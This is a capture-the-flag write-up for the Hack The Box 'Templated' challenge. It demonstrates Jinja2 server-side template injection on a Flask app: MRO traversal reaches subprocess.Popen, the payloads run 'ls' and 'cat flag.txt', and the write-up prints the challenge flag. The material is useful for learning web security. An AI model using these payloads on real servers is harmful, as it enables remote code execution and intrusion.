# Templated
> Write-up author: jon-brandy
## DESCRIPTION:
Can you exploit this simple mistake?
## HINT:
- NONE
## STEPS:
1. First, open the host given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208017009-400c8215-3d3c-435c-a33b-6a2683b533f7.png)


2. Actually the `<p>` tag value does give us a hint, we shall do RCE (Remote Code Execution) with python.
3. In jinja, python will evaluate any command inside the curly brackets.
4. Then it will appear in the HTML of the webpage.
5. To make sure of it, let's insert `config.items()` inside the curly brackets but first encode it into an url using cyberchef.

> ENCODED COMMAND TO URL

```sh
165.232.32.50:31397/%7B%7Bconfig.items()%7D%7D
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208018797-a54a741f-083b-4351-b5e9-de3141b2c9c1.png)


6. Now we proved that the server is running on flask, to exploit the website, we can make use of MRO (Method Resolution Order).

> NOTES

```
MRO is used to traverse up the request library in flask to import os library.
Once the attacker have access to the os library then "they" can execute any command and it will be rendered to the attacker.

Have access to os library == have the shell access.
```

7. To have access to os library, we need to find the index of a special class in python which has a function called `popen`.
8. Here's how to find it.

> THE COMMAND

```py
{{"".__class__.__mro__[1].__subclasses__()}}
```

> ENCODED

```sh
165.232.32.50:31397/%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__()%7D%7D
```

> RESULT


![image](https://user-images.githubusercontent.com/70703371/208021124-cca496d6-4a5b-4ebe-8c63-6e164641981d.png)


![image](https://user-images.githubusercontent.com/70703371/208021170-ebcffe9d-bdbc-4dfa-8956-175d71dfc3b9.png)


9. Since it's harder for us to find the index, let's slice it.

> SLICE 100: 

```py
{{"".__class__.__mro__[1].__subclasses__()[100:]}}
```

> RESULT


![image](https://user-images.githubusercontent.com/70703371/208021582-d74c41be-d6bf-4cd6-804d-bfbc33c50a58.png)


10. There's no `popen()`, let's slice it again at 200.
11. Actually i didn't find it until i sliced at 400. I Finally found the `popen()`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208021762-9a541c60-c6ee-4903-a9ab-96956ce7c0d8.png)


12. Filter it again to 410

```py
{{"".__class__.__mro__[1].__subclasses__()[410:]}}
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208021998-4f69c242-a22c-4b3b-9985-03edef5dddf0.png)


13. Great the index is **414**.
14. To have access to the host machine, we shall encode this command, and paste the encoded one:

```py
{{"".__class__.__mro__[1].__subclasses__()[414]("ls",shell=True,stdout=-1).communicate()}}
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208023254-665429c5-ce24-40ea-bf56-19591b960fbc.png)


15. Now we know there's a flag.txt file, let's cat it.

```py
{{"".__class__.__mro__[1].__subclasses__()[414]("cat flag.txt",shell=True,stdout=-1).communicate()}}
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/208023499-1e9a7b53-5643-43d2-b334-8ff9a73e7a6a.png)


16. Finally, we got the flag!

## FLAG

```
HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}
```


## LEARNING REFERENCES

```
https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
```


